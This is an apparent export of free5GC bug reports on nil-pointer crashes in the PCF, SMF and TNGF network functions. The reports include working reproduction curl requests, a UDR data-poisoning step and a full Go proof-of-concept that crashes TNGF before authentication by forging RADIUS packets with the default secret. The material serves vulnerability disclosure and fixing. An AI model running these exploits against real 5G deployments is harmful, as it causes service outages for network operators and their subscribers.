items.title: [Bugs] PCF app-sessions bdt indication nil dereference
items.body:
## Bug Decription
`PCF` `POST /npcf-policyauthorization/v1/app-sessions` panics with `runtime error: invalid memory address or nil pointer dereference` inside `handleBDTPolicyInd` whenever the AF/NEF supplies a `bdtRefId` that is not present in UDR's `policyData.bdtData` collection.

The function unconditionally dereferences `resp.BdtData` **before** checking `err != nil`, `pd != nil`, or `resp == nil`. When UDR returns HTTP 404 for an unknown `bdtRefId`, the consumer wrapper returns `(nil, &problemDetails, nil)`, and the very next line in `handleBDTPolicyInd` reads `resp.BdtData` off a nil pointer.

A second, distinct nil-deref hides further down the same function: `bdtData.TransPolicy.RecTimeInt.StartTime` is a four-level chained pointer walk (`bdtData → *TransPolicy → *RecTimeInt → StartTime`). If a peer NF (AF/NEF, or anything else holding a valid `nudr-dr` token) writes a `BdtData` record into UDR with `transPolicy: null` or `recTimeInt: null`, every subsequent PCF lookup of that `bdtRefId` panics on the same code path.

Faulty call site (deployed `v4.2.2` line numbers; identical at upstream PCF master commit `df6c0da`):

```go
// internal/sbi/processor/policyauthorization.go
func (p *Processor) handleBDTPolicyInd(pcfSelf *pcf_context.PCFContext,
    appSessCtx *models.AppSessionContext,
) (err error) {
    ...
    resp, pd, err := p.Consumer().GetBdtData(udrUri, req.BdtRefId)
    bdtData := resp.BdtData                                            // <-- 1156: panic if resp == nil
    if err != nil {
        return fmt.Errorf("UDR Get BdtData error[%s]", err.Error())    // checked AFTER deref
    } else if pd != nil {
        return fmt.Errorf("UDR Get BdtData fault[%s]", pd.Detail)      // checked AFTER deref
    } else if resp == nil {
        return fmt.Errorf("UDR Get BdtData error")                     // unreachable: line 1156 already crashed
    } else {
        if bdtData.TransPolicy.RecTimeInt.StartTime.After(time.Now()) { // <-- 1164: 3-step nil deref chain
            ...
        } else if bdtData.TransPolicy.RecTimeInt.StopTime.Before(time.Now()) { // <-- 1166: same
            ...
        }
    }
}
```

The consumer wrapper that produces the nil `resp`:

```go
// internal/sbi/consumer/udr_service.go
func (s *nudrService) GetBdtData(uri string, bdtRefId string) (
    resp *DataRepository.ReadIndividualBdtDataResponse, problemDetails *models.ProblemDetails, err error,
) {
    ...
    resp, localErr := client.IndividualBdtDataDocumentApi.ReadIndividualBdtData(ctx, &readBdtDataReq)
    if localErr == nil {
        return resp, nil, nil
    }
    if genericErr, ok := localErr.(openapi.GenericOpenAPIError); ok {
        if problemDetails, ok := genericErr.Model().(models.ProblemDetails); ok {
            return nil, &problemDetails, nil   // <-- the path that 404 takes
        }
        return nil, nil, localErr
    }
    return nil, nil, localErr
}
```

Both `(nil, &pd, nil)` and `(nil, nil, err)` paths feed a nil `resp` to the caller, and the caller derefs it before any of its three error checks fire.

This is **distinct from**:
- free5gc/free5gc#823, #898, #948, #981 — those touch AUSF / UDM EAP/SUPI handling, not PCF policyauthorization.
- The `bdtpolicy.go:198/213` `bdtData.TransPolicy.RecTimeInt = ...` chain — that one only fires after an AspId match in PCF's own `BDTPolicyContext` create flow; the panic here is on the AF→PCF policyauthorization path and reproduces immediately on the very first request, with **no UDR pre-provisioning required**.

The same 1156 / 1164 lines are **unfixed at the latest upstream master commit `df6c0da`**.

## To Reproduce
Steps to reproduce the behaviour:

1. Run free5GC `v4.2.2` Docker deployment with NRF at `10.100.200.4:8000`, PCF at `10.100.200.3:8000`, UDR reachable, OAuth enabled.

2. Obtain an `npcf-policyauthorization` access token from any registered NF profile (the lab AMF works — the AF profile would also work):

```bash
TOKEN=$(curl -s -X POST 'http://10.100.200.4:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=client_credentials' \
  --data-urlencode 'nfType=AMF' \
  --data-urlencode 'nfInstanceId=09c2c82b-4ed5-43df-b0fc-c7098d1fa5a0' \
  --data-urlencode 'targetNfType=PCF' \
  --data-urlencode 'scope=npcf-policyauthorization' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')
```

3. POST an `AppSessionContext` whose `ascReqData.bdtRefId` does not exist in UDR. The two mandatory fields the entry-point validator checks (`api_policyauthorization.go:110`) are `suppFeat` and `notifUri`; everything else is optional, so the minimal panic-triggering body is:

```bash
curl -i -X POST 'http://10.100.200.3:8000/npcf-policyauthorization/v1/app-sessions' \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  --data '{"ascReqData":{"notifUri":"http://10.0.0.1/notif","suppFeat":"0","supi":"imsi-208930000000001","bdtRefId":"nonexistent-bdtref-99999"}}'
```

4. PCF returns `HTTP/1.1 500 Internal Server Error` (Gin recovery converts the panic). `docker logs pcf` shows:

```text
[ERRO][PCF][Consumer] openapi error: 404, Not Found
[ERRO][PCF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
github.com/free5gc/pcf/internal/sbi/processor.(*Processor).handleBDTPolicyInd(0xc0002d08e0, 0x19ded80, 0xc000010e28)
        /go/src/free5gc/NFs/pcf/internal/sbi/processor/policyauthorization.go:1156 +0x298
github.com/free5gc/pcf/internal/sbi/processor.(*Processor).postAppSessCtxProcedure(0xc0002d08e0, 0xc000010e28)
        /go/src/free5gc/NFs/pcf/internal/sbi/processor/policyauthorization.go:169 +0x6e5
github.com/free5gc/pcf/internal/sbi/processor.(*Processor).HandlePostAppSessionsContext(0xc0002d08e0, 0xc0005fc000, ...)
        /go/src/free5gc/NFs/pcf/internal/sbi/processor/policyauthorization.go:142 +0xc6
github.com/free5gc/pcf/internal/sbi.(*Server).HTTPPostAppSessions(...)
        /go/src/free5gc/NFs/pcf/internal/sbi/api_policyauthorization.go:119 +0x271
[INFO][PCF][GIN] | 500 |    10.100.200.1 | POST    | /npcf-policyauthorization/v1/app-sessions |  |
```

Each subsequent malformed request reproduces the panic; PCF stays up because Gin's `defer recover()` catches it, but every request results in a stack trace in logs and a forced 500. Sustained traffic constitutes a per-request DoS / log-volume amplification.

5. **Variant for the second nil-deref at line 1164**: provision a malformed `BdtData` into UDR (any holder of an `nudr-dr` token can do this), then call PCF with the matching `bdtRefId`:

```bash
# Stage 1: corrupt UDR via PUT bdt-data with TransPolicy missing
UDR_TOKEN=$(curl -s -X POST 'http://10.100.200.4:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'grant_type=client_credentials' \
  --data-urlencode 'nfType=AF' \
  --data-urlencode 'nfInstanceId=11111111-2222-3333-4444-555555555555' \
  --data-urlencode 'targetNfType=UDR' \
  --data-urlencode 'scope=nudr-dr' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["access_token"])')

curl -s -X PUT 'http://<udr-ip>:8000/nudr-dr/v2/policy-data/bdt-data/poison-1' \
  -H "Authorization: Bearer $UDR_TOKEN" -H 'Content-Type: application/json' \
  --data '{"aspId":"poison","bdtRefId":"poison-1"}'   # no transPolicy field

# Stage 2: ask PCF for that bdtRefId — bdtData.TransPolicy is nil → panic on bdtData.TransPolicy.RecTimeInt
curl -i -X POST 'http://10.100.200.3:8000/npcf-policyauthorization/v1/app-sessions' \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  --data '{"ascReqData":{"notifUri":"http://10.0.0.1/notif","suppFeat":"0","supi":"imsi-208930000000001","bdtRefId":"poison-1"}}'
```

The line-1164 panic surfaces as `panic: runtime error: invalid memory address or nil pointer dereference` from `handleBDTPolicyInd` at the `bdtData.TransPolicy.RecTimeInt.StartTime.After(...)` site. Same 500 outcome, same per-request DoS.

## Expected Behavior
`handleBDTPolicyInd` should validate the consumer response **before** indexing into it:

```go
resp, pd, err := p.Consumer().GetBdtData(udrUri, req.BdtRefId)
if err != nil {
    return fmt.Errorf("UDR Get BdtData error[%s]", err.Error())
}
if pd != nil {
    return fmt.Errorf("UDR Get BdtData fault[%s]", pd.Detail)
}
if resp == nil {
    return fmt.Errorf("UDR Get BdtData returned nil response")
}
bdtData := resp.BdtData
if bdtData.TransPolicy == nil || bdtData.TransPolicy.RecTimeInt == nil {
    return fmt.Errorf("UDR BdtData has nil TransPolicy/RecTimeInt for bdtRefId=%s", req.BdtRefId)
}
if bdtData.TransPolicy.RecTimeInt.StartTime.After(time.Now()) { ... }
```

Result of a missing or malformed UDR `bdtRefId` should be a controlled `404 BDT_REF_NOT_FOUND` (or similar) `ProblemDetails`, not a goroutine panic / 500.

## Environment
- free5GC Version: `v4.2.2`
- PCF binary: `free5gc/pcf:v4.2.2` (PCF release tag `v1.4.3`).
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.25.5 linux/amd64` (build toolchain; runtime: `free5gc/pcf:v4.2.2` Docker image)

### Log File

```text
2026-04-27T03:21:33.813300012Z [ERRO][PCF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
goroutine 12738 [running]:

        /go/src/free5gc/NFs/pcf/internal/sbi/processor/policyauthorization.go:1156 +0x298
github.com/free5gc/pcf/internal/sbi/processor.(*Processor).postAppSessCtxProcedure(0xc0002d08e0, 0xc000010e28)
        /go/src/free5gc/NFs/pcf/internal/sbi/processor/policyauthorization.go:169 +0x6e5
github.com/free5gc/pcf/internal/sbi/processor.(*Processor).HandlePostAppSessionsContext(0xc0002d08e0, 0xc0005fc000, ...)
        /go/src/free5gc/NFs/pcf/internal/sbi/processor/policyauthorization.go:142 +0xc6
```

items.title: [Bugs] TNGF UELoadbyIDi panics when iterating UE pool with nil UEIdentity after RADIUS creates context without identity, causing DoS
items.body:
## Bug Description

A remote, unauthenticated attacker can crash and kill the TNGF process by sending a RADIUS Access-Request with a valid EAP-5G payload (containing AN parameters but **without UEIdentity**), followed by any IKE_AUTH message. The `UELoadbyIDi()` function in `context.go` iterates the UE pool and unconditionally accesses `thisUE.UEIdentity.Buffer` without checking if `UEIdentity` is nil. When a UE context was created via RADIUS without the UEIdentity AN parameter, `UEIdentity` remains nil, and the `.Buffer` access causes an immediate nil pointer dereference panic. The IKE dispatcher's `recover()` handler calls `Fatalf` → `os.Exit(1)`, **killing the entire TNGF process**.

This is a **pre-authentication** vulnerability — the attacker does not need a valid SIM, K/OPC keys, or any credentials. The RADIUS shared secret is the only requirement, and it is a static configuration value (default: `free5gctngf`).

**Crash site**:

`tngf/pkg/context/context.go` line 210:
```go
func (context *TNGFContext) UELoadbyIDi(idi []byte) *TNGFUe {
    var ue *TNGFUe
    context.UePool.Range(func(_, thisUE interface{}) bool {
        strIdi := hex.EncodeToString(idi)
        strSuci := hex.EncodeToString(thisUE.(*TNGFUe).UEIdentity.Buffer)  // PANIC: UEIdentity is nil
```

**Fatal recovery** in `tngf/pkg/ike/dispatcher.go` line 24:
```go
defer func() {
    if p := recover(); p != nil {
        ikeLog.Fatalf("panic: %v\n%s", p, string(debug.Stack()))  // os.Exit(1)
    }
}()
```

**Root cause chain**:
1. RADIUS handler creates UE at `handler.go:277`: `ue := tngfSelf.NewTngfUe()`
2. Sets `ue.UEIdentity = anParameters.UEIdentity` at line 285 — **nil if AN param not included**
3. UE is stored in `UePool`
4. Any subsequent IKE_AUTH triggers `UELoadbyIDi()` which iterates ALL UEs in pool
5. When it encounters the UE with nil `UEIdentity`, it dereferences `.Buffer` → panic
6. `Fatalf` kills the entire process

## To Reproduce

**Prerequisites**: free5GC v4.2.1 with TNGF running. RADIUS shared secret: `free5gctngf` (default).

**No SIM card, credentials, or WiFi AP required.**

### Step 1: Build the RADIUS EAP-5G PoC

Save as `tngf_radius_eap5g.go`:

```go
package main

import (
	"crypto/hmac"
	"crypto/md5"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"time"
)

var secret = []byte("free5gctngf")

func buildRADIUS(pktID byte, auth []byte, eapMsg []byte, callingStation string) []byte {
	var attrs []byte
	cs := []byte(callingStation)
	attrs = append(attrs, 31, byte(2+len(cs)))
	attrs = append(attrs, cs...)
	attrs = append(attrs, 79, byte(2+len(eapMsg)))
	attrs = append(attrs, eapMsg...)
	maOffset := len(attrs)
	attrs = append(attrs, 80, 18)
	attrs = append(attrs, make([]byte, 16)...)

	pktLen := uint16(20 + len(attrs))
	pkt := make([]byte, 0, pktLen)
	pkt = append(pkt, 1, pktID)
	lenB := make([]byte, 2)
	binary.BigEndian.PutUint16(lenB, pktLen)
	pkt = append(pkt, lenB...)
	pkt = append(pkt, auth...)
	pkt = append(pkt, attrs...)

	h := hmac.New(md5.New, secret)
	h.Write(pkt)
	copy(pkt[20+maOffset+2:20+maOffset+18], h.Sum(nil))
	return pkt
}

func main() {
	target := "10.100.200.1:1812"
	addr, _ := net.ResolveUDPAddr("udp", target)
	conn, _ := net.DialUDP("udp", nil, addr)
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(5 * time.Second))

	auth := make([]byte, 16)
	for i := range auth { auth[i] = byte(rand.Intn(256)) }

	// Round 1: EAP-Response/Identity
	fmt.Println("[*] Round 1: EAP-Response/Identity")
	identity := []byte("test@free5gc")
	eapId := []byte{0x02, 0x00, 0x00, byte(5 + len(identity)), 0x01}
	eapId = append(eapId, identity...)
	conn.Write(buildRADIUS(0x01, auth, eapId, "AA:BB:CC:DD:EE:FF"))

	buf := make([]byte, 4096)
	n, _ := conn.Read(buf)
	fmt.Printf("[+] Response: %d bytes, code=%d\n", n, buf[0])

	// Extract EAP identifier from Access-Challenge
	var eapReqID byte
	ab := buf[20:n]
	for len(ab) >= 2 { if ab[0]==79 && ab[1]>4 { eapReqID=ab[3]; break }; ab=ab[ab[1]:] }

	// Round 2: EAP-Response/EAP-5G with AN params (GUAMI+PLMN, NO UEIdentity) + NAS
	fmt.Println("[*] Round 2: EAP-5G with AN params (NO UEIdentity) + NAS")
	guami := []byte{0x02, 0xf8, 0x39, 0x40, 0x01, 0x00}
	plmn := []byte{0x02, 0xf8, 0x39}
	var anParams []byte
	anParams = append(anParams, 0x01, byte(len(guami)))
	anParams = append(anParams, guami...)
	anParams = append(anParams, 0x02, byte(len(plmn)))
	anParams = append(anParams, plmn...)
	// NO UEIdentity (type=6) — this is what causes the crash

	nasPDU := []byte{0x7E,0x00,0x41,0x01, 0x00,0x09, 0x01,0x02,0xf8,0x39,0x00,0x00,0x00,0x00,0x01}

	var vd []byte
	vd = append(vd, 0x02, 0x00)
	al := make([]byte, 2); binary.BigEndian.PutUint16(al, uint16(len(anParams)))
	vd = append(vd, al...)
	vd = append(vd, anParams...)
	nl := make([]byte, 2); binary.BigEndian.PutUint16(nl, uint16(len(nasPDU)))
	vd = append(vd, nl...)
	vd = append(vd, nasPDU...)

	var eap5g []byte
	eap5g = append(eap5g, 0x02, eapReqID, 0x00, 0x00, 0xFE, 0x00,0x28,0xAF, 0x00,0x00,0x00,0x03)
	eap5g = append(eap5g, vd...)
	binary.BigEndian.PutUint16(eap5g[2:4], uint16(len(eap5g)))

	auth2 := make([]byte, 16)
	for i := range auth2 { auth2[i] = byte(rand.Intn(256)) }
	conn.SetDeadline(time.Now().Add(5 * time.Second))
	conn.Write(buildRADIUS(0x02, auth2, eap5g, "AA:BB:CC:DD:EE:FF"))
	conn.Read(buf)
	fmt.Println("[+] UE context created in TNGF (UEIdentity=nil)")
	fmt.Println("[*] Now send ANY IKE_AUTH to trigger UELoadbyIDi crash")
}
```

Build: `CGO_ENABLED=0 go build -o tngf_radius_eap5g tngf_radius_eap5g.go`

### Step 2: Build IKE_SA_INIT + IKE_AUTH sender

Use the [free5gc/n3iwue](https://github.com/free5gc/n3iwue) with config pointing to the TNGF IKE address:

```yaml
configuration:
    N3IWFInformation:
        IPSecIfaceAddr: <TNGF_IKE_ADDRESS>  # e.g. 10.100.200.1
```

### Step 3: Execute

```bash
# Step 3a: Send RADIUS to create UE with nil UEIdentity
./tngf_radius_eap5g

# Step 3b: Send IKE_SA_INIT + IKE_AUTH (any IDi, doesn't need to match)
docker exec n3iwue ./n3iwue -c /path/to/tngf-config.yaml

# Step 3c: Verify TNGF is dead
docker exec tngf ps aux | grep tngf   # empty — process killed
docker logs tngf 2>&1 | grep "panic"
```

## Expected Behavior

`UELoadbyIDi()` should check `thisUE.UEIdentity != nil` before accessing `.Buffer`. UEs created without UEIdentity should be skipped during IDi matching.

```go
context.UePool.Range(func(_, thisUE interface{}) bool {
    ue := thisUE.(*TNGFUe)
    if ue.UEIdentity == nil {
        return true  // skip UEs without identity
    }
    strSuci := hex.EncodeToString(ue.UEIdentity.Buffer)
```

## Environment

- free5GC Version: `v4.2.1`
- OS: `Ubuntu 24.04.2 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.26.1 linux/amd64`

## Log File

```
[INFO][TNGF][Radius] Handle EAP-Res/5G-NAS
[INFO][TNGF][Radius] Selected AMF Name: AMF
[INFO][TNGF][NGAP] [TNGF] Send Initial UE Message
[INFO][TNGF][IKE] Handle IKE_SA_INIT
[INFO][TNGF][IKE] Handle IKE_AUTH
[FATA][TNGF][IKE] panic: runtime error: invalid memory address or nil pointer dereference
goroutine 54 [running]:
runtime/debug.Stack()
    /usr/local/go/src/runtime/debug/stack.go:26 +0x5e
github.com/free5gc/tngf/pkg/ike.Dispatch.func1()
    /go/src/free5gc/NFs/tngf/pkg/ike/dispatcher.go:24 +0x38
panic({0xbcf5a0?, 0x135c620?})
```

items.title: [Bugs] SMF charging notification chgInfo nil dereference, causing DoS
items.body:
## Bug Decription
`SMF` `POST /nsmf-callback/notify_<smContextRef>` (the **unauthenticated** Charging Notification callback) panics with `runtime error: invalid memory address or nil pointer dereference` inside `chargingNotificationProcedure` whenever the supplied `smContextRef` resolves to a live SMContext that has at least one PDU session active.

`smContext.UrrTable[upfId]` is populated for **every** URR registered via `RegisterUrr()` — including the **non-charging** Measurement-Before-QoS-Enforcement (MBQE) and Measurement-After-QoS-Enforcement (MAQE) URRs added by `addUrrToPath` → `addUrrToNode` (`internal/context/datapath.go:531-558`) whenever `urrPeriod != 0` or `urrThreshold != 0` (the lab default is `urrPeriod: 10s, urrThreshold: 1000` — these are the values shipped in `config/smfcfg.yaml`).

`smContext.ChargingInfo[urrID]` is **only** populated for charging URRs (in `AddChargingRules` at `datapath.go:1245` and `GetOrCreateUrr` at `datapath.go:1325`). MBQE/MAQE URRs are absent from this map.

The chargingNotificationProcedure iterates **every** URR in `UrrTable` and dereferences `ChargingInfo[urrID]` without nil-checking the result:

```go
// internal/sbi/processor/notifier.go (deployed v4.2.2 — SMF v1.4.3 line numbers,
//                                     identical at upstream master commit 2232d29)
func (p *Processor) chargingNotificationProcedure(
    req models.ChargingNotifyRequest, smContextRef string,
) *models.ProblemDetails {
    if smContext := smf_context.GetSMContextByRef(smContextRef); smContext != nil {
        smContext.SMLock.Lock()
        defer smContext.SMLock.Unlock()
        upfUrrMap := make(map[string][]*smf_context.URR)
        for _, reauthorizeDetail := range req.ReauthorizationDetails {
            rg := reauthorizeDetail.RatingGroup
            ...
            for upfId, entries := range smContext.UrrTable {
                for urrID, entry := range entries {
                    chgInfo := smContext.ChargingInfo[urrID]   // <-- 48: nil for MBQE/MAQE URRs
                    if chgInfo.RatingGroup == rg ||             // <-- 49: nil deref panic
                       chgInfo.ChargingLevel == smf_context.PduSessionCharging {
                        ...
                    }
                }
            }
        }
        ...
    }
}
```

The other `ChargingInfo[urrID]` access sites in the codebase are properly guarded — `getUrrsByRg` (`charging_trigger.go:256`) explicitly nil-checks `smContext.ChargingInfo[urrID] != nil` before the field deref, and `ulcl_procedure.go:169-170` filters via `pccRule.Datapath.GetChargingUrr(smContext)` (`datapath.go:1213-1216`) which only returns URRs already present in `ChargingInfo`. **`notifier.go:48-49` is the lone unsafe site**.

The endpoint is **unauthenticated**: SMF's callback router (`internal/sbi/server.go:74-81`) only invokes the OAuth check when the route's `:smContextRef` parameter is non-empty. The wildcard route `/:notifyUri` registered for `HTTPChargingNotification` (`api_callback.go:30-32`) does **not** carry a `smContextRef` parameter, so the auth middleware short-circuits and any caller on the SBI network can hit the procedure.

This is the **post-#904 follow-on bug**: free5gc/free5gc#904 patched the original `strings.Split(notifyUri, "_")[1]` index-out-of-range panic by adding a `notify_` prefix check at `api_callback.go:73-78`. Once that fix landed, the chargingNotificationProcedure became reliably reachable for valid `notify_<smContextRef>` requests and exposed the separate `ChargingInfo[urrID]` nil deref.

This is **distinct from**:
- free5gc/free5gc#904 — the now-fixed `Split[1]` panic on short/malformed `notifyUri`. My finding fires **after** that path has been patched.
- free5gc/free5gc#905 / #906 — UPI handler panics on invalid topology / overlapping pools. Different SBI surface.
- free5gc/free5gc#907 / #966 / #991 — different sinks in the create / SM-policy / TI flows.

The same `notifier.go:48-49` lines are **unfixed at the latest upstream master commit `2232d29`**.

## To Reproduce
Steps to reproduce the behaviour:

1. Run free5GC `v4.2.2` Docker deployment with the default `config/smfcfg.yaml` (`urrPeriod: 10`, `urrThreshold: 1000`) so MBQE/MAQE measurement URRs are added to every PDU session.

2. Provision the test subscriber so PDU session establishment can complete. The default lab UE registers with `S-NSSAI sst=1, sd=112233`; mongo must contain a matching `sessionManagementSubscriptionData` entry:

```bash
docker exec <mongo-container> mongo --quiet free5gc --eval '
db["subscriptionData.provisionedData.smData"].insertOne({
  "ueId": "imsi-208930000000001",
  "servingPlmnId": "20893",
  "singleNssai": {"sst": 1, "sd": "112233"},
  "dnnConfigurations": {
    "internet": {
      "pduSessionTypes": {"defaultSessionType": "IPV4", "allowedSessionTypes": ["IPV4"]},
      "sscModes": {"defaultSscMode": "SSC_MODE_1", "allowedSscModes": ["SSC_MODE_2","SSC_MODE_3"]},
      "5gQosProfile": {"5qi": 9, "arp": {"priorityLevel": 8, "preemptCap": "", "preemptVuln": ""}, "priorityLevel": 8},
      "sessionAmbr": {"uplink": "200 Mbps", "downlink": "100 Mbps"}
    }
  }
});'
```

3. Bring the registered UE through PDU session establishment via UERANSIM (or any RAN simulator). On success, SMF logs:

```text
[INFO][SMF][CTX] Allocated UE IP address: 10.61.0.1
[INFO][SMF][PduSess] Sending PFCP Session Establishment Request
[INFO][SMF][PduSess] Received PFCP Session Establishment Accepted Response
[INFO][SMF][PduSess] Received PFCP Session Modification Accepted Response from AN UPF
```

At this point `smContext.UrrTable` contains MBQE and MAQE URRs but `smContext.ChargingInfo` does not (no charging URRs were created in this minimal flow).

4. Read the active `smContextRef` from SMF logs:

```bash
SMCTX=$(docker logs --tail 100 smf 2>&1 | grep -oE "urn:uuid:[a-f0-9-]+" | tail -1)
echo "Active smContextRef: $SMCTX"
```

5. Send the unauthenticated charging notification — **no `Authorization` header required**:

```bash
curl -i -X POST "http://10.100.200.13:8000/nsmf-callback/notify_${SMCTX}" \
  -H 'Content-Type: application/json' \
  --data '{"reauthorizationDetails":[{"ratingGroup":1}]}'
```

6. SMF returns `HTTP/1.1 500 Internal Server Error` (Gin recovery converts the panic). `docker logs smf` shows:

```text
[INFO][SMF][Charging] Handle Charging Notification
[INFO][SMF][Charging] Force update charging information for rating group 1
[ERRO][SMF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
goroutine 519 [running]:
panic({0xeb2da0?, 0x1986d10?})
        /usr/local/go/src/runtime/panic.go:783 +0x132
github.com/free5gc/smf/internal/sbi/processor.(*Processor).chargingNotificationProcedure(0xc000494760, ..., {0xc00032a2bb, 0x2d})
        /go/src/free5gc/NFs/smf/internal/sbi/processor/notifier.go:49 +0x5a4
github.com/free5gc/smf/internal/sbi/processor.(*Processor).HandleChargingNotification(0xc000494760, 0xc00065c300, ...)
        /go/src/free5gc/NFs/smf/internal/sbi/processor/notifier.go:25 +0xd5
github.com/free5gc/smf/internal/sbi.(*Server).HTTPChargingNotification(0xc000496aa0, 0xc00065c300)
        /go/src/free5gc/NFs/smf/internal/sbi/api_callback.go:82 +0x373
```

Each subsequent identical request reproduces the panic deterministically — the SMF process keeps running because Gin's `defer recover()` catches it, but every notification fails with a stack trace and the legitimate charging-reauthorization is dropped on the floor. **No authentication is required**, so the panic is reachable by any host on the SBI network (the same trust boundary as #860 / #904 / #905 / #906 documented for SMF's callback and UPI surfaces).

## Expected Behavior
`chargingNotificationProcedure` should nil-guard the `ChargingInfo[urrID]` lookup before dereferencing the value, mirroring the precedent already set by `getUrrsByRg` at `charging_trigger.go:255-261`:

```go
for upfId, entries := range smContext.UrrTable {
    for urrID, entry := range entries {
        chgInfo := smContext.ChargingInfo[urrID]
        if chgInfo == nil {
            continue   // non-charging URR (e.g. MBQE/MAQE measurement URR)
        }
        if chgInfo.RatingGroup == rg ||
           chgInfo.ChargingLevel == smf_context.PduSessionCharging {
            ...
        }
    }
}
```

A malformed or attacker-supplied callback should result in either the existing 404 (when the SMContext doesn't exist) or a 204 No Content with the request silently ignored for non-charging URRs — never a `runtime error: invalid memory address or nil pointer dereference` / 500.

## Environment
- free5GC Version: `v4.2.2`
- SMF binary: `free5gc/smf:v4.2.2` (commit hash `2232d299`, build time `2026-04-21T03:13:45Z`). The same `notifier.go:48-49` lines are **unfixed at the latest upstream master commit `2232d29`** (no nil guard added).
- OS: `Ubuntu 22.04 LTS`
- Kernel version: `6.14.0-37-generic`
- go version: `go1.25.5 linux/amd64` (build toolchain; runtime: `free5gc/smf:v4.2.2` Docker image)
- Validation date: `2026-04-27`
- Deployment: Docker-based lab on the internal SBI network `10.100.200.0/24`. SMF `10.100.200.13`, UPF `10.100.200.14`, NRF `10.100.200.4`, AMF `10.100.200.16`, MongoDB container `081af9111608_mongodb`. The registered UE is `imsi-208930000000001` with `S-NSSAI sst=1, sd=112233, dnn=internet` (UERANSIM-driven).

### Log File
Representative panic trace from the validated reproduction:

```text
2026-04-27T05:43:33.426209203Z [INFO][SMF][Charging] Handle Charging Notification
2026-04-27T05:43:33.426224010Z [INFO][SMF][Charging] Force update charging information for rating group 1
2026-04-27T05:43:33.426316713Z [ERRO][SMF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
goroutine 519 [running]:
github.com/free5gc/smf/internal/sbi/processor.(*Processor).chargingNotificationProcedure(0xc000494760, {{0x0, 0x0}, {0xc0009a2b10, 0x1, 0x1}}, {0xc00032a2bb, 0x2d})
        /go/src/free5gc/NFs/smf/internal/sbi/processor/notifier.go:49 +0x5a4
github.com/free5gc/smf/internal/sbi/processor.(*Processor).HandleChargingNotification(0xc000494760, 0xc00065c300, {{0x0, 0x0}, {0xc0009a2b10, 0x1, 0x1}}, {0xc00032a2bb, 0x2d})
        /go/src/free5gc/NFs/smf/internal/sbi/processor/notifier.go:25 +0xd5
github.com/free5gc/smf/internal/sbi.(*Server).HTTPChargingNotification(0xc000496aa0, 0xc00065c300)
        /go/src/free5gc/NFs/smf/internal/sbi/api_callback.go:82 +0x373
```

### Notes on exploitability
The panic is reachable **without any authentication** because SMF's callback group only OAuth-checks routes whose path parameter is named `smContextRef`; the `:notifyUri` wildcard route used by `HTTPChargingNotification` doesn't have that parameter, so the auth check is skipped. Any host on the SBI network — or any compromised NF — can drive this 500 storm with one HTTP POST per active SMContext.

Reachability requires only that:
- the SMContext is in the SMF's pool (PDU session has been established),
- `urrPeriod` or `urrThreshold` is non-zero (default `smfcfg.yaml` ships with both non-zero),
- and the attacker knows / can guess / can read from logs the `urn:uuid:<smContextRef>` value.

The first two are baseline operating conditions for any production deployment. The third is trivially leaked by SMF's own structured logs and by AMF's `Location` header on the original `POST /nsmf-pdusession/v1/sm-contexts` create that returns a `/sm-contexts/<smContextRef>` URI.

items.body:
`PCF`'s `POST /npcf-policyauthorization/v1/app-sessions` handler can panic on valid authenticated input when the request enables traffic-routing support through `suppFeat=1` but does not include an `AfRoutReq`.

In the validated Docker runtime, replaying a valid authenticated `POST /npcf-policyauthorization/v1/app-sessions` request with:
- `ascReqData.suppFeat = "1"`
- a normal `notifUri`
- `ueIpv4`
- `dnn`
- `medComponents` containing an `afAppId`

caused a server-side panic and the client received `500 Internal Server Error`.

Validated runtime behavior:
- valid authenticated `POST /npcf-policyauthorization/v1/app-sessions` with `suppFeat="1"` -> `500 Internal Server Error`
- the same request shape with `suppFeat="0"` avoids the crash and returns `201 Created`

This is a denial-of-service condition on the app-session create path. The container stayed alive in this lab because Gin recovery handled the panic, but the endpoint becomes remotely crashable and can be repeatedly driven into panic by network input.

Code evidence:
- affected route:
  - `NFs/pcf/internal/sbi/api_policyauthorization.go`
- create handler path:
  - `NFs/pcf/internal/sbi/processor/policyauthorization.go`
- the create path can call `provisioningOfTrafficRoutingInfo(smPolicy, appID, routeReq, ...)` even when `routeReq == nil`:
  - `NFs/pcf/internal/sbi/processor/policyauthorization.go`
- `provisioningOfTrafficRoutingInfo` dereferences `routeReq` without a nil check:
  - `NFs/pcf/internal/sbi/processor/policyauthorization.go`

## To Reproduce
Steps to reproduce the behavior:

1. Obtain a valid `npcf-policyauthorization` token:
```bash
curl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'grant_type=client_credentials&nfType=NEF&nfInstanceId=b84c4f0a-6010-4972-8480-e44e625b9ee4&targetNfType=PCF&scope=npcf-policyauthorization'
```

2. Send a valid authenticated create request with `suppFeat="1"`:
```bash
curl -i -X POST 'http://10.100.200.9:8000/npcf-policyauthorization/v1/app-sessions' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <valid_npcf_policyauthorization_jwt>' \
  --data '{"ascReqData":{"suppFeat":"1","notifUri":"http://127.0.0.1:9999/appsess","ueIpv4":"10.60.0.3","dnn":"internet","medComponents":{"1":{"medCompN":1,"afAppId":"app1"}}}}'
```

Observed output:
```text
HTTP/1.1 500 Internal Server Error
```

3. Check `pcf` logs:
```text
[ERRO][PCF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
github.com/free5gc/pcf/internal/sbi/processor.provisioningOfTrafficRoutingInfo(..., 0x0, ...)
[INFO][PCF][GIN] | 500 | 10.100.200.1 | POST | /npcf-policyauthorization/v1/app-sessions |
```

